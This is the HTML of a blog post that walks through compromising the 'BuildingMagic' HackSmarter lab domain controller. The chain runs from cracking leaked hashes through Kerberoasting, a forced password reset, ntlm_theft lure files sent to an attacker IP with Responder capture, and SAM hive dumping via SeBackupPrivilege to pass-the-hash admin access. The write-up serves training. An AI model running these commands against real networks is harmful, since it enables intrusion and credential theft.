@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HackSmarter Walkthrough: BuildingMagic - Complete Pentesting GuideIntroductionWelcome to this comprehensive penetration testing walkthrough for the BuildingMagic machine from HackSmarter. In this deta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HS-BuildingMagic">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="HackSmarter Walkthrough: BuildingMagic - Complete Pentesting GuideIntroductionWelcome to this comprehensive penetration testing walkthrough for the BuildingMagic machine from HackSmarter. In this deta">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/BuildingMagic/cracked.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/BuildingMagic/kerberoastble.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/BuildingMagic/access_new_share.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/BuildingMagic/captured_hash.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/BuildingMagic/sebackuppriv.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/BuildingMagic/adminhash.png">
+<meta property="article:published_time" content="2025-11-01T12:36:21.000Z">
+<meta property="article:modified_time" content="2025-11-01T12:37:04.895Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="HackSmarter">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/BuildingMagic/cracked.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HS-BuildingMagic</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/31/HS-Sysco/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&text=HS-BuildingMagic"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&is_video=false&description=HS-BuildingMagic"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HS-BuildingMagic&body=Check out this article: https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&title=HS-BuildingMagic"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&name=HS-BuildingMagic&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/01/HS-BuildingMagic/&t=HS-BuildingMagic"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackSmarter-Walkthrough-BuildingMagic-Complete-Pentesting-Guide"><span class="toc-number">1.</span> <span class="toc-text">HackSmarter Walkthrough: BuildingMagic - Complete Pentesting Guide</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hosts-File-Configuration"><span class="toc-number">1.2.2.</span> <span class="toc-text">Hosts File Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking-from-Leaked-Database"><span class="toc-number">1.3.</span> <span class="toc-text">Password Cracking from Leaked Database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaked-Database-File"><span class="toc-number">1.3.1.</span> <span class="toc-text">Leaked Database File</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-Enumeration-with-BloodHound"><span class="toc-number">1.4.</span> <span class="toc-text">LDAP Enumeration with BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting-Attack"><span class="toc-number">1.4.1.</span> <span class="toc-text">Kerberoasting Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Abusing-ForceChangePassword-Privilege"><span class="toc-number">1.5.</span> <span class="toc-text">Abusing ForceChangePassword Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-File-Share"><span class="toc-number">1.5.1.</span> <span class="toc-text">Accessing the File Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Relay-Attack"><span class="toc-number">1.6.</span> <span class="toc-text">NTLM Relay Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Capturing-NTLM-Hashes-with-Responder"><span class="toc-number">1.6.1.</span> <span class="toc-text">Capturing NTLM Hashes with Responder</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-Administrator"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation to Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Access-via-WinRM"><span class="toc-number">1.7.1.</span> <span class="toc-text">Initial Access via WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-SeBackupPrivilege"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploiting SeBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Access-as-Administrator"><span class="toc-number">1.7.3.</span> <span class="toc-text">Final Access as Administrator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HS-BuildingMagic
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-01T12:36:21.000Z" class="dt-published" itemprop="datePublished">2025-11-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HackSmarter/" rel="tag">HackSmarter</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="HackSmarter-Walkthrough-BuildingMagic-Complete-Pentesting-Guide"><a href="#HackSmarter-Walkthrough-BuildingMagic-Complete-Pentesting-Guide" class="headerlink" title="HackSmarter Walkthrough: BuildingMagic - Complete Pentesting Guide"></a>HackSmarter Walkthrough: BuildingMagic - Complete Pentesting Guide</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to this comprehensive penetration testing walkthrough for the <strong>BuildingMagic</strong> machine from HackSmarter. In this detailed writeup, I’ll guide you through the complete exploitation chain, from initial reconnaissance to achieving domain administrator privileges on a Windows Active Directory environment.</p>
+<p>This walkthrough demonstrates real-world attack techniques including <strong>password cracking</strong>, <strong>Kerberoasting</strong>, <strong>LDAP enumeration with BloodHound</strong>, <strong>NTLM relay attacks</strong>, and <strong>privilege escalation via SeBackupPrivilege</strong>. The tools featured in this pentesting guide include <strong>Nmap</strong>, <strong>NetExec</strong>, <strong>BloodHound CE</strong>, <strong>BloodyAD</strong>, <strong>Responder</strong>, <strong>ntlm_theft</strong>, <strong>Hashcat</strong>, and <strong>Evil-WinRM</strong>.</p>
+<p>Whether you’re preparing for OSCP, studying Active Directory security, or looking to enhance your red team skills, this step-by-step writeup will provide valuable insights into modern penetration testing methodologies.</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Nmap-Scan-Results"><a href="#Nmap-Scan-Results" class="headerlink" title="Nmap Scan Results"></a>Nmap Scan Results</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE    REASON          VERSION</span><br><span class="line">53/tcp    open  tcpwrapped syn-ack ttl 126</span><br><span class="line">80/tcp    open  http       syn-ack ttl 126 Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp   open  tcpwrapped syn-ack ttl 126</span><br><span class="line">139/tcp   open  tcpwrapped syn-ack ttl 126</span><br><span class="line">445/tcp   open  tcpwrapped syn-ack ttl 126</span><br><span class="line">3268/tcp  open  tcpwrapped syn-ack ttl 126</span><br><span class="line">3269/tcp  open  tcpwrapped syn-ack ttl 126</span><br><span class="line">3389/tcp  open  tcpwrapped syn-ack ttl 126</span><br><span class="line">8080/tcp  open  tcpwrapped syn-ack ttl 126</span><br><span class="line">49670/tcp open  tcpwrapped syn-ack ttl 126</span><br><span class="line">49676/tcp open  ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49710/tcp open  unknown    syn-ack ttl 126</span><br></pre></td></tr></table></figure>
+
+<h3 id="Hosts-File-Configuration"><a href="#Hosts-File-Configuration" class="headerlink" title="Hosts File Configuration"></a>Hosts File Configuration</h3><p>Add the following to <code>/etc/hosts</code> with the target IP address in front:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP buildingmagic.local dc01.buildingmagic.local</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Password-Cracking-from-Leaked-Database"><a href="#Password-Cracking-from-Leaked-Database" class="headerlink" title="Password Cracking from Leaked Database"></a>Password Cracking from Leaked Database</h2><h3 id="Leaked-Database-File"><a href="#Leaked-Database-File" class="headerlink" title="Leaked Database File"></a>Leaked Database File</h3><p>We discovered a leaked database containing user credentials with MD5 password hashes:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1	r.widdleton	Ron Widdleton	Intern Builder	c4a21c4d438819d73d24851e7966229c</span><br><span class="line">2	n.bottomsworth	Neville Bottomsworth Planner	61ee643c5043eadbcdc6c9d1e3ebd298</span><br><span class="line">3	l.layman	Luna Layman	Planner		8960516f904051176cc5ef67869de88f</span><br><span class="line">4	c.smith		Chen Smith	Builder		bbd151e24516a48790b2cd5845e7f148</span><br><span class="line">5	d.thomas	Dean Thomas	Builder		4d14ff3e264f6a9891aa6cea1cfa17cb</span><br><span class="line">6	s.winnigan	Samuel Winnigan	HR Manager	078576a0569f4e0b758aedf650cb6d9a</span><br><span class="line">7	p.jackson	Parvati Jackson	Shift Lead	eada74b2fa7f5e142ac412d767831b54</span><br><span class="line">8	b.builder	Bob Builder	Electrician	dd4137bab3b52b55f99f18b7cd595448</span><br><span class="line">9	t.ren		Theodore Ren	Safety Officer	bfaf794a81438488e57ee3954c27cd75</span><br><span class="line">10	e.macmillan	Ernest Macmillan Surveyor	47d23284395f618bea1959e710bc68ef</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BuildingMagic/cracked.png" alt="Cracked password hashes"></p>
+<p>After cracking the MD5 hashes and performing password spraying, we found valid credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="LDAP-Enumeration-with-BloodHound"><a href="#LDAP-Enumeration-with-BloodHound" class="headerlink" title="LDAP Enumeration with BloodHound"></a>LDAP Enumeration with BloodHound</h2><p>With valid credentials in hand, we can now dump LDAP data for BloodHound CE analysis:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.buildingmagic.local -u r.widdleton -p lilronron --bloodhound --dns-server 10.0.31.60 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kerberoasting-Attack"><a href="#Kerberoasting-Attack" class="headerlink" title="Kerberoasting Attack"></a>Kerberoasting Attack</h3><p>BloodHound revealed a Kerberoastable user with ForceChangePassword privileges over another account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.buildingmagic.local -u r.widdleton -p lilronron --kerberoasting output.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BuildingMagic/kerberoastble.png" alt="Kerberoastable user identified"></p>
+<p>Cracking the Kerberos TGS ticket with Hashcat:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat kerb.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Successfully cracked credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.haggard:rubeushagrid</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Abusing-ForceChangePassword-Privilege"><a href="#Abusing-ForceChangePassword-Privilege" class="headerlink" title="Abusing ForceChangePassword Privilege"></a>Abusing ForceChangePassword Privilege</h2><p>Now we exploit the ForceChangePassword permission that <code>r.haggard</code> has over <code>h.potch</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.0.31.60 -d Buildingmagic.local -u r.haggard -p rubeushagrid set password h.potch rubeushagrid</span><br></pre></td></tr></table></figure>
+
+<h3 id="Accessing-the-File-Share"><a href="#Accessing-the-File-Share" class="headerlink" title="Accessing the File Share"></a>Accessing the File Share</h3><p>With control over <code>h.potch</code>, we gain read and write access to a new SMB share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc01.buildingmagic.local -u h.potch  -p rubeushagrid --shares</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BuildingMagic/access_new_share.png" alt="Access to new share obtained"></p>
+<p>Connecting to the share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U &quot;h.potch&quot; \\\\10.0.31.60\\File-Share</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="NTLM-Relay-Attack"><a href="#NTLM-Relay-Attack" class="headerlink" title="NTLM Relay Attack"></a>NTLM Relay Attack</h2><p>The share is empty, which presents an opportunity. We can populate it with malicious files that will relay NTLM hashes back to us using the ntlm_theft toolkit: <a target="_blank" rel="noopener" href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a></p>
+<p>Generating malicious files:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py --generate all --server 10.200.18.115 -f important</span><br></pre></td></tr></table></figure>
+
+<p>Establishing an SMB session and uploading our files:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U &quot;h.potch&quot; \\\\10.0.31.60\\File-Share</span><br></pre></td></tr></table></figure>
+
+<p>Upload all malicious files recursively:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; recurse ON</span><br><span class="line">smb: \&gt; prompt OFF</span><br><span class="line">smb: \&gt; mput *</span><br></pre></td></tr></table></figure>
+
+<h3 id="Capturing-NTLM-Hashes-with-Responder"><a href="#Capturing-NTLM-Hashes-with-Responder" class="headerlink" title="Capturing NTLM Hashes with Responder"></a>Capturing NTLM Hashes with Responder</h3><p>In another terminal, start Responder to capture authentication attempts:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BuildingMagic/captured_hash.png" alt="NTLM hash captured"></p>
+<p>Cracking the captured NTLMv2 hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat ha /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Successfully cracked:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H.GRANGON:magic4ever</span><br></pre></td></tr></table></figure>
+
+<p>This user is a member of the Remote Desktop Admins Group, allowing WinRM access.</p>
+<hr>
+<h2 id="Privilege-Escalation-to-Administrator"><a href="#Privilege-Escalation-to-Administrator" class="headerlink" title="Privilege Escalation to Administrator"></a>Privilege Escalation to Administrator</h2><h3 id="Initial-Access-via-WinRM"><a href="#Initial-Access-via-WinRM" class="headerlink" title="Initial Access via WinRM"></a>Initial Access via WinRM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.buildingmagic.local -u H.GRANGON -p magic4ever</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploiting-SeBackupPrivilege"><a href="#Exploiting-SeBackupPrivilege" class="headerlink" title="Exploiting SeBackupPrivilege"></a>Exploiting SeBackupPrivilege</h3><p>Checking current privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
+
+<p>The account has <code>SeBackupPrivilege</code> enabled!</p>
+<p><img src="/images/BuildingMagic/sebackuppriv.png" alt="SeBackupPrivilege identified"></p>
+<p>We can abuse this privilege to dump the SAM and SYSTEM registry hives:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd c:\</span><br><span class="line">mkdir Temp</span><br><span class="line">reg save hklm\sam c:\Temp\sam</span><br><span class="line">reg save hklm\system c:\Temp\system</span><br></pre></td></tr></table></figure>
+
+<p>Download the registry hives:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download sam</span><br><span class="line">download system</span><br></pre></td></tr></table></figure>
+
+<p>Extract password hashes using pypykatz:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypykatz registry --sam sam system</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/BuildingMagic/adminhash.png" alt="Administrator hash extracted"></p>
+<p><strong>Note:</strong> The SAM hash is for the local Administrator account, but it also works for <code>a.flatch</code> who is in the ADMINISTRATORS group.</p>
+<h3 id="Final-Access-as-Administrator"><a href="#Final-Access-as-Administrator" class="headerlink" title="Final Access as Administrator"></a>Final Access as Administrator</h3><p>Using the extracted NTLM hash for pass-the-hash authentication:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.0.31.60 -u a.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce</span><br></pre></td></tr></table></figure>
+
+<p><strong>Success!</strong> We now have full administrator access to the BuildingMagic domain controller.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This walkthrough demonstrated a complete Active Directory penetration test, showcasing multiple attack vectors including credential cracking, Kerberoasting, Active Directory privilege abuse, NTLM relay attacks, and privilege escalation through Windows token privileges. Each technique represents real-world scenarios that penetration testers encounter during security assessments.</p>
+<p>I hope you found this HackSmarter writeup valuable for your penetration testing journey!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HackSmarter-Walkthrough-BuildingMagic-Complete-Pentesting-Guide"><span class="toc-number">1.</span> <span class="toc-text">HackSmarter Walkthrough: BuildingMagic - Complete Pentesting Guide</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hosts-File-Configuration"><span class="toc-number">1.2.2.</span> <span class="toc-text">Hosts File Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking-from-Leaked-Database"><span class="toc-number">1.3.</span> <span class="toc-text">Password Cracking from Leaked Database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaked-Database-File"><span class="toc-number">1.3.1.</span> <span class="toc-text">Leaked Database File</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-Enumeration-with-BloodHound"><span class="toc-number">1.4.</span> <span class="toc-text">LDAP Enumeration with BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting-Attack"><span class="toc-number">1.4.1.</span> <span class="toc-text">Kerberoasting Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Abusing-ForceChangePassword-Privilege"><span class="toc-number">1.5.</span> <span class="toc-text">Abusing ForceChangePassword Privilege</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-the-File-Share"><span class="toc-number">1.5.1.</span> <span class="toc-text">Accessing the File Share</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Relay-Attack"><span class="toc-number">1.6.</span> <span class="toc-text">NTLM Relay Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Capturing-NTLM-Hashes-with-Responder"><span class="toc-number">1.6.1.</span> <span class="toc-text">Capturing NTLM Hashes with Responder</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-Administrator"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation to Administrator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Access-via-WinRM"><span class="toc-number">1.7.1.</span> <span class="toc-text">Initial Access via WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-SeBackupPrivilege"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploiting SeBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Final-Access-as-Administrator"><span class="toc-number">1.7.3.</span> <span class="toc-text">Final Access as Administrator</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.8.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
